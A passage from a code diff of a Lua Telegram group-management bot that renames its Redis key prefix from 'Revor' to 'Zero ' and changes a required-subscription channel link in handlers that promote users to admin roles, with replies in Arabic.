+Redis:sadd(Zero .."Zero :DevelopersQ:Groups",UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته مطور ثانوي").Reply,"md",true)  
 end
 end
@@ -3153,13 +3156,13 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:Developers:Groups",UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :Developers:Groups",UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته مطور مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Developers:Groups",UserId_Info.id) 
+Redis:sadd(Zero .."Zero :Developers:Groups",UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته مطور ").Reply,"md",true)  
 end
 end
@@ -3167,10 +3170,10 @@ if UserName[1] == "مالك" then
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if Redis:sismember(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته مالك مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,UserId_Info.id) 
+Redis:sadd(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته مالك ").Reply,"md",true)  
 end
 end
@@ -3179,13 +3182,13 @@ if not msg.TheBasicsm then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id,UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته منشئ اساسي مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:TheBasics:Group"..msg_chat_id,UserId_Info.id) 
+Redis:sadd(Zero .."Zero :TheBasics:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته منشئ اساسي ").Reply,"md",true)  
 end
 end
@@ -3194,13 +3197,13 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:Originators:Group"..msg_chat_id,UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :Originators:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته منشئ  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Originators:Group"..msg_chat_id,UserId_Info.id) 
+Redis:sadd(Zero .."Zero :Originators:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته منشئ  ").Reply,"md",true)  
 end
 end
@@ -3209,13 +3212,13 @@ if not msg.Originators then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(5)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:Managers:Group"..msg_chat_id,UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :Managers:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته مدير  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Managers:Group"..msg_chat_id,UserId_Info.id) 
+Redis:sadd(Zero .."Zero :Managers:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته مدير  ").Reply,"md",true)  
 end
 end
@@ -3224,16 +3227,16 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:SetId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:SetId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الرفع) من قبل المنشئين","md",true)
 end 
-if Redis:sismember(Revor.."Revor:Addictive:Group"..msg_chat_id,UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :Addictive:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته ادمن  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Addictive:Group"..msg_chat_id,UserId_Info.id) 
+Redis:sadd(Zero .."Zero :Addictive:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته ادمن  ").Reply,"md",true)  
 end
 end
@@ -3242,16 +3245,16 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:SetId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:SetId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الرفع) من قبل المنشئين","md",true)
 end 
-if Redis:sismember(Revor.."Revor:Distinguished:Group"..msg_chat_id,UserId_Info.id) then
+if Redis:sismember(Zero .."Zero :Distinguished:Group"..msg_chat_id,UserId_Info.id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته مميز  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Distinguished:Group"..msg_chat_id,UserId_Info.id) 
+Redis:sadd(Zero .."Zero :Distinguished:Group"..msg_chat_id,UserId_Info.id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"⌔︙تم ترقيته مميز  ").Reply,"md",true)  
 end
 end
@@ -3271,13 +3274,13 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:DevelopersQ:Groups",Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :DevelopersQ:Groups",Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته مطور ثانوي مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:DevelopersQ:Groups",Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :DevelopersQ:Groups",Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته مطور ثانوي").Reply,"md",true)  
 end
 end
@@ -3286,13 +3289,13 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:Developers:Groups",Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :Developers:Groups",Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته مطور مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Developers:Groups",Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :Developers:Groups",Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته مطور ").Reply,"md",true)  
 end
 end
@@ -3300,10 +3303,10 @@ if TextMsg == "مالك" then
 if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
-if Redis:sismember(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته مالك مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته مالك ").Reply,"md",true)  
 end
 end
@@ -3312,13 +3315,13 @@ if not msg.TheBasicsm then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته منشئ اساسي مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:TheBasics:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :TheBasics:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته منشئ اساسي ").Reply,"md",true)  
 end
 end
@@ -3327,13 +3330,13 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:Originators:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :Originators:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته منشئ  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Originators:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :Originators:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته منشئ  ").Reply,"md",true)  
 end
 end
@@ -3342,13 +3345,13 @@ if not msg.Originators then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(5)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:Managers:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :Managers:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته مدير  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Managers:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :Managers:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته مدير  ").Reply,"md",true)  
 end
 end
@@ -3357,16 +3360,16 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:SetId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:SetId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الرفع) من قبل المنشئين","md",true)
 end 
-if Redis:sismember(Revor.."Revor:Addictive:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :Addictive:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته ادمن  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Addictive:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :Addictive:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته ادمن  ").Reply,"md",true)  
 end
 end
@@ -3375,16 +3378,16 @@ if not msg.Addictive then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(7)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:SetId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:SetId"..msg_chat_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,"⌔︙تم تعطيل (الرفع) من قبل المنشئين","md",true)
 end 
-if Redis:sismember(Revor.."Revor:Distinguished:Group"..msg_chat_id,Message_Reply.sender.user_id) then
+if Redis:sismember(Zero .."Zero :Distinguished:Group"..msg_chat_id,Message_Reply.sender.user_id) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته مميز  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Distinguished:Group"..msg_chat_id,Message_Reply.sender.user_id) 
+Redis:sadd(Zero .."Zero :Distinguished:Group"..msg_chat_id,Message_Reply.sender.user_id) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"⌔︙تم ترقيته مميز  ").Reply,"md",true)  
 end
 end
@@ -3406,13 +3409,13 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(1)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:DevelopersQ:Groups",UserId) then
+if Redis:sismember(Zero .."Zero :DevelopersQ:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم ترقيته مطور ثانوي مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:DevelopersQ:Groups",UserId) 
+Redis:sadd(Zero .."Zero :DevelopersQ:Groups",UserId) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم ترقيته مطور ثانوي").Reply,"md",true)  
 end
 end
@@ -3421,13 +3424,13 @@ if not msg.DevelopersQ then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(2)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:Developers:Groups",UserId) then
+if Redis:sismember(Zero .."Zero :Developers:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم ترقيته مطور مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Developers:Groups",UserId) 
+Redis:sadd(Zero .."Zero :Developers:Groups",UserId) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"⌔︙تم ترقيته مطور ").Reply,"md",true)  
 end
 end
@@ -3436,13 +3439,13 @@ if not msg.Developers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(3)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,UserId[2]) then
+if Redis:sismember(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته مالك مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:TheBasicsQ:Group"..msg_chat_id,UserId[2]) 
+Redis:sadd(Zero .."Zero :TheBasicsQ:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته مالك ").Reply,"md",true)  
 end
 end
@@ -3451,13 +3454,13 @@ if not msg.TheBasicsm then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(44)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:TheBasics:Group"..msg_chat_id,UserId[2]) then
+if Redis:sismember(Zero .."Zero :TheBasics:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته منشئ اساسي مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:TheBasics:Group"..msg_chat_id,UserId[2]) 
+Redis:sadd(Zero .."Zero :TheBasics:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته منشئ اساسي ").Reply,"md",true)  
 end
 end
@@ -3466,13 +3469,13 @@ if not msg.TheBasics then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(4)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:Originators:Group"..msg_chat_id,UserId[2]) then
+if Redis:sismember(Zero .."Zero :Originators:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته منشئ  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Originators:Group"..msg_chat_id,UserId[2]) 
+Redis:sadd(Zero .."Zero :Originators:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته منشئ  ").Reply,"md",true)  
 end
 end
@@ -3481,13 +3484,13 @@ if not msg.Originators then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(5)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if Redis:sismember(Revor.."Revor:Managers:Group"..msg_chat_id,UserId[2]) then
+if Redis:sismember(Zero .."Zero :Managers:Group"..msg_chat_id,UserId[2]) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته مدير  مسبقا ").Reply,"md",true)  
 else
-Redis:sadd(Revor.."Revor:Managers:Group"..msg_chat_id,UserId[2]) 
+Redis:sadd(Zero .."Zero :Managers:Group"..msg_chat_id,UserId[2]) 
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId[2],"⌔︙تم ترقيته مدير  ").Reply,"md",true)  
 end
 end
@@ -3496,16 +3499,16 @@ if not msg.Managers then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*⌔︙هاذا الامر يخص { '..Controller_Num(6)..' }* ',"md",true)  
 end
 if ChannelJoin(msg) == false then
-local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/uui9u'}, },}}
+local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/zErOPro'}, },}}
 return LuaTele.sendText(msg.chat_id,msg.id,'*\n⌔︙عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
 end
-if not msg.Originators and not Redis:get(Revor.."Revor:Status:SetId"..msg_chat_id) then
+if not msg.Originators and not Redis:get(Zero .."Zero :Status:SetId"..msg_chat_id) then
